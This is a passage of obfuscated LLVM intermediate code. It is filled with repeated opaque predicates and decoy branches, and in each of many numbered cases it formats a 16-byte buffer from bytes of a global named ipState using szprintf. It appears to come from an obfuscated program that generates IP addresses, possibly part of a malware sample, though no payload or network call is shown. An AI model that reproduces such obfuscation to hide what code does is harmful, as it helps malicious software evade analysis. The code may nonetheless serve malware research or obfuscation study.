  %79 = load i32, i32* @x.65
  %80 = load i32, i32* @y.66
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %78, label %87, label %94

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %89 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %90 = zext i8 %89 to i32
  %91 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 (i8*, i8*, ...) @szprintf(i8* %88, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.679, i32 0, i32 0), i32 %90, i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %originalBBpart28
  %95 = load i32, i32* @x.65
  %96 = load i32, i32* @y.66
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %94
  %103 = load i32, i32* %1, align 4
  %104 = icmp eq i32 %103, 3
  %105 = load i32, i32* @x.65
  %106 = load i32, i32* @y.66
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %104, label %113, label %120

; <label>:113:                                    ; preds = %originalBBpart212
  %114 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %115 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %116 = zext i8 %115 to i32
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %118 = zext i8 %117 to i32
  %119 = call i32 (i8*, i8*, ...) @szprintf(i8* %114, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.680, i32 0, i32 0), i32 %116, i32 %118)
  br label %120

; <label>:120:                                    ; preds = %113, %originalBBpart212
  %121 = load i32, i32* %1, align 4
  %122 = icmp eq i32 %121, 4
  br i1 %122, label %123, label %130

; <label>:123:                                    ; preds = %120
  %124 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %125 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %126 = zext i8 %125 to i32
  %127 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %128 = zext i8 %127 to i32
  %129 = call i32 (i8*, i8*, ...) @szprintf(i8* %124, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.681, i32 0, i32 0), i32 %126, i32 %128)
  br label %130

; <label>:130:                                    ; preds = %123, %120
  %131 = load i32, i32* @x.65
  %132 = load i32, i32* @y.66
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %130
  %139 = load i32, i32* %1, align 4
  %140 = icmp eq i32 %139, 5
  %141 = load i32, i32* @x.65
  %142 = load i32, i32* @y.66
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %140, label %149, label %156

; <label>:149:                                    ; preds = %originalBBpart216
  %150 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %151 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %152 = zext i8 %151 to i32
  %153 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %154 = zext i8 %153 to i32
  %155 = call i32 (i8*, i8*, ...) @szprintf(i8* %150, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.682, i32 0, i32 0), i32 %152, i32 %154)
  br label %156

; <label>:156:                                    ; preds = %149, %originalBBpart216
  %157 = load i32, i32* @x.65
  %158 = load i32, i32* @y.66
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %156
  %165 = load i32, i32* %1, align 4
  %166 = icmp eq i32 %165, 6
  %167 = load i32, i32* @x.65
  %168 = load i32, i32* @y.66
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %166, label %175, label %182

; <label>:175:                                    ; preds = %originalBBpart220
  %176 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %178 = zext i8 %177 to i32
  %179 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %180 = zext i8 %179 to i32
  %181 = call i32 (i8*, i8*, ...) @szprintf(i8* %176, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.683, i32 0, i32 0), i32 %178, i32 %180)
  br label %182

; <label>:182:                                    ; preds = %175, %originalBBpart220
  %183 = load i32, i32* %1, align 4
  %184 = icmp eq i32 %183, 7
  br i1 %184, label %185, label %192

; <label>:185:                                    ; preds = %182
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %187 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %188 = zext i8 %187 to i32
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %190 = zext i8 %189 to i32
  %191 = call i32 (i8*, i8*, ...) @szprintf(i8* %186, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.684, i32 0, i32 0), i32 %188, i32 %190)
  br label %192

; <label>:192:                                    ; preds = %185, %182
  %193 = load i32, i32* %1, align 4
  %194 = icmp eq i32 %193, 8
  br i1 %194, label %195, label %202

; <label>:195:                                    ; preds = %192
  %196 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %197 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %198 = zext i8 %197 to i32
  %199 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %200 = zext i8 %199 to i32
  %201 = call i32 (i8*, i8*, ...) @szprintf(i8* %196, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.685, i32 0, i32 0), i32 %198, i32 %200)
  br label %202

; <label>:202:                                    ; preds = %195, %192
  %203 = load i32, i32* %1, align 4
  %204 = icmp eq i32 %203, 9
  br i1 %204, label %205, label %212

; <label>:205:                                    ; preds = %202
  %206 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %207 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %208 = zext i8 %207 to i32
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %210 = zext i8 %209 to i32
  %211 = call i32 (i8*, i8*, ...) @szprintf(i8* %206, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.686, i32 0, i32 0), i32 %208, i32 %210)
  br label %212

; <label>:212:                                    ; preds = %205, %202
  %213 = load i32, i32* %1, align 4
  %214 = icmp eq i32 %213, 10
  br i1 %214, label %215, label %238

; <label>:215:                                    ; preds = %212
  %216 = load i32, i32* @x.65
  %217 = load i32, i32* @y.66
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %215
  %224 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %226 = zext i8 %225 to i32
  %227 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %228 = zext i8 %227 to i32
  %229 = call i32 (i8*, i8*, ...) @szprintf(i8* %224, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.661, i32 0, i32 0), i32 %226, i32 %228)
  %230 = load i32, i32* @x.65
  %231 = load i32, i32* @y.66
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %238

; <label>:238:                                    ; preds = %originalBBpart224, %212
  %239 = load i32, i32* %1, align 4
  %240 = icmp eq i32 %239, 11
  br i1 %240, label %241, label %264

; <label>:241:                                    ; preds = %238
  %242 = load i32, i32* @x.65
  %243 = load i32, i32* @y.66
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %241
  %250 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %251 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %252 = zext i8 %251 to i32
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %254 = zext i8 %253 to i32
  %255 = call i32 (i8*, i8*, ...) @szprintf(i8* %250, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.663, i32 0, i32 0), i32 %252, i32 %254)
  %256 = load i32, i32* @x.65
  %257 = load i32, i32* @y.66
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %264

; <label>:264:                                    ; preds = %originalBBpart228, %238
  %265 = load i32, i32* %1, align 4
  %266 = icmp eq i32 %265, 12
  br i1 %266, label %267, label %274

; <label>:267:                                    ; preds = %264
  %268 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %270 = zext i8 %269 to i32
  %271 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %272 = zext i8 %271 to i32
  %273 = call i32 (i8*, i8*, ...) @szprintf(i8* %268, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.664, i32 0, i32 0), i32 %270, i32 %272)
  br label %274

; <label>:274:                                    ; preds = %267, %264
  %275 = load i32, i32* %1, align 4
  %276 = icmp eq i32 %275, 13
  br i1 %276, label %277, label %284

; <label>:277:                                    ; preds = %274
  %278 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %279 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %280 = zext i8 %279 to i32
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %282 = zext i8 %281 to i32
  %283 = call i32 (i8*, i8*, ...) @szprintf(i8* %278, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.687, i32 0, i32 0), i32 %280, i32 %282)
  br label %284

; <label>:284:                                    ; preds = %277, %274
  %285 = load i32, i32* @x.65
  %286 = load i32, i32* @y.66
  %287 = sub i32 %285, 1
  %288 = mul i32 %285, %287
  %289 = urem i32 %288, 2
  %290 = icmp eq i32 %289, 0
  %291 = icmp slt i32 %286, 10
  %292 = or i1 %290, %291
  br i1 %292, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %284
  %293 = load i32, i32* %1, align 4
  %294 = icmp eq i32 %293, 14
  %295 = load i32, i32* @x.65
  %296 = load i32, i32* @y.66
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %294, label %303, label %310

; <label>:303:                                    ; preds = %originalBBpart232
  %304 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %306 = zext i8 %305 to i32
  %307 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %308 = zext i8 %307 to i32
  %309 = call i32 (i8*, i8*, ...) @szprintf(i8* %304, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.688, i32 0, i32 0), i32 %306, i32 %308)
  br label %310

; <label>:310:                                    ; preds = %303, %originalBBpart232
  %311 = load i32, i32* @x.65
  %312 = load i32, i32* @y.66
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %310
  %319 = load i32, i32* %1, align 4
  %320 = icmp eq i32 %319, 15
  %321 = load i32, i32* @x.65
  %322 = load i32, i32* @y.66
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %320, label %329, label %352

; <label>:329:                                    ; preds = %originalBBpart236
  %330 = load i32, i32* @x.65
  %331 = load i32, i32* @y.66
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %329
  %338 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %339 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %340 = zext i8 %339 to i32
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %342 = zext i8 %341 to i32
  %343 = call i32 (i8*, i8*, ...) @szprintf(i8* %338, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.689, i32 0, i32 0), i32 %340, i32 %342)
  %344 = load i32, i32* @x.65
  %345 = load i32, i32* @y.66
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %352

; <label>:352:                                    ; preds = %originalBBpart240, %originalBBpart236
  %353 = load i32, i32* %1, align 4
  %354 = icmp eq i32 %353, 16
  br i1 %354, label %355, label %362

; <label>:355:                                    ; preds = %352
  %356 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %358 = zext i8 %357 to i32
  %359 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %360 = zext i8 %359 to i32
  %361 = call i32 (i8*, i8*, ...) @szprintf(i8* %356, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.690, i32 0, i32 0), i32 %358, i32 %360)
  br label %362

; <label>:362:                                    ; preds = %355, %352
  %363 = load i32, i32* %1, align 4
  %364 = icmp eq i32 %363, 17
  br i1 %364, label %365, label %388

; <label>:365:                                    ; preds = %362
  %366 = load i32, i32* @x.65
  %367 = load i32, i32* @y.66
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %365
  %374 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %375 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %376 = zext i8 %375 to i32
  %377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %378 = zext i8 %377 to i32
  %379 = call i32 (i8*, i8*, ...) @szprintf(i8* %374, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.691, i32 0, i32 0), i32 %376, i32 %378)
  %380 = load i32, i32* @x.65
  %381 = load i32, i32* @y.66
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %388

; <label>:388:                                    ; preds = %originalBBpart244, %362
  %389 = load i32, i32* %1, align 4
  %390 = icmp eq i32 %389, 18
  br i1 %390, label %391, label %398

; <label>:391:                                    ; preds = %388
  %392 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %394 = zext i8 %393 to i32
  %395 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %396 = zext i8 %395 to i32
  %397 = call i32 (i8*, i8*, ...) @szprintf(i8* %392, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.692, i32 0, i32 0), i32 %394, i32 %396)
  br label %398

; <label>:398:                                    ; preds = %391, %388
  %399 = load i32, i32* @x.65
  %400 = load i32, i32* @y.66
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %398
  %407 = load i32, i32* %1, align 4
  %408 = icmp eq i32 %407, 19
  %409 = load i32, i32* @x.65
  %410 = load i32, i32* @y.66
  %411 = sub i32 %409, 1
  %412 = mul i32 %409, %411
  %413 = urem i32 %412, 2
  %414 = icmp eq i32 %413, 0
  %415 = icmp slt i32 %410, 10
  %416 = or i1 %414, %415
  br i1 %416, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %408, label %417, label %424

; <label>:417:                                    ; preds = %originalBBpart248
  %418 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %419 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %420 = zext i8 %419 to i32
  %421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %422 = zext i8 %421 to i32
  %423 = call i32 (i8*, i8*, ...) @szprintf(i8* %418, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.693, i32 0, i32 0), i32 %420, i32 %422)
  br label %424

; <label>:424:                                    ; preds = %417, %originalBBpart248
  %425 = load i32, i32* %1, align 4
  %426 = icmp eq i32 %425, 20
  br i1 %426, label %427, label %434

; <label>:427:                                    ; preds = %424
  %428 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %430 = zext i8 %429 to i32
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %432 = zext i8 %431 to i32
  %433 = call i32 (i8*, i8*, ...) @szprintf(i8* %428, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.694, i32 0, i32 0), i32 %430, i32 %432)
  br label %434

; <label>:434:                                    ; preds = %427, %424
  %435 = load i32, i32* %1, align 4
  %436 = icmp eq i32 %435, 21
  br i1 %436, label %437, label %460

; <label>:437:                                    ; preds = %434
  %438 = load i32, i32* @x.65
  %439 = load i32, i32* @y.66
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %437
  %446 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %447 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %448 = zext i8 %447 to i32
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %450 = zext i8 %449 to i32
  %451 = call i32 (i8*, i8*, ...) @szprintf(i8* %446, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.695, i32 0, i32 0), i32 %448, i32 %450)
  %452 = load i32, i32* @x.65
  %453 = load i32, i32* @y.66
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br label %460

; <label>:460:                                    ; preds = %originalBBpart252, %434
  %461 = load i32, i32* %1, align 4
  %462 = icmp eq i32 %461, 22
  br i1 %462, label %463, label %470

; <label>:463:                                    ; preds = %460
  %464 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %466 = zext i8 %465 to i32
  %467 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %468 = zext i8 %467 to i32
  %469 = call i32 (i8*, i8*, ...) @szprintf(i8* %464, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.696, i32 0, i32 0), i32 %466, i32 %468)
  br label %470

; <label>:470:                                    ; preds = %463, %460
  %471 = load i32, i32* %1, align 4
  %472 = icmp eq i32 %471, 23
  br i1 %472, label %473, label %496

; <label>:473:                                    ; preds = %470
  %474 = load i32, i32* @x.65
  %475 = load i32, i32* @y.66
  %476 = sub i32 %474, 1
  %477 = mul i32 %474, %476
  %478 = urem i32 %477, 2
  %479 = icmp eq i32 %478, 0
  %480 = icmp slt i32 %475, 10
  %481 = or i1 %479, %480
  br i1 %481, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %473
  %482 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %483 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %484 = zext i8 %483 to i32
  %485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %486 = zext i8 %485 to i32
  %487 = call i32 (i8*, i8*, ...) @szprintf(i8* %482, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.697, i32 0, i32 0), i32 %484, i32 %486)
  %488 = load i32, i32* @x.65
  %489 = load i32, i32* @y.66
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %496

; <label>:496:                                    ; preds = %originalBBpart256, %470
  %497 = load i32, i32* @x.65
  %498 = load i32, i32* @y.66
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %496
  %505 = load i32, i32* %1, align 4
  %506 = icmp eq i32 %505, 24
  %507 = load i32, i32* @x.65
  %508 = load i32, i32* @y.66
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %506, label %515, label %522

; <label>:515:                                    ; preds = %originalBBpart260
  %516 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %518 = zext i8 %517 to i32
  %519 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %520 = zext i8 %519 to i32
  %521 = call i32 (i8*, i8*, ...) @szprintf(i8* %516, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.698, i32 0, i32 0), i32 %518, i32 %520)
  br label %522

; <label>:522:                                    ; preds = %515, %originalBBpart260
  %523 = load i32, i32* @x.65
  %524 = load i32, i32* @y.66
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %522
  %531 = load i32, i32* %1, align 4
  %532 = icmp eq i32 %531, 25
  %533 = load i32, i32* @x.65
  %534 = load i32, i32* @y.66
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %532, label %541, label %548

; <label>:541:                                    ; preds = %originalBBpart264
  %542 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %543 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %544 = zext i8 %543 to i32
  %545 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %546 = zext i8 %545 to i32
  %547 = call i32 (i8*, i8*, ...) @szprintf(i8* %542, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.699, i32 0, i32 0), i32 %544, i32 %546)
  br label %548

; <label>:548:                                    ; preds = %541, %originalBBpart264
  %549 = load i32, i32* %1, align 4
  %550 = icmp eq i32 %549, 26
  br i1 %550, label %551, label %558

; <label>:551:                                    ; preds = %548
  %552 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %553 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %554 = zext i8 %553 to i32
  %555 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %556 = zext i8 %555 to i32
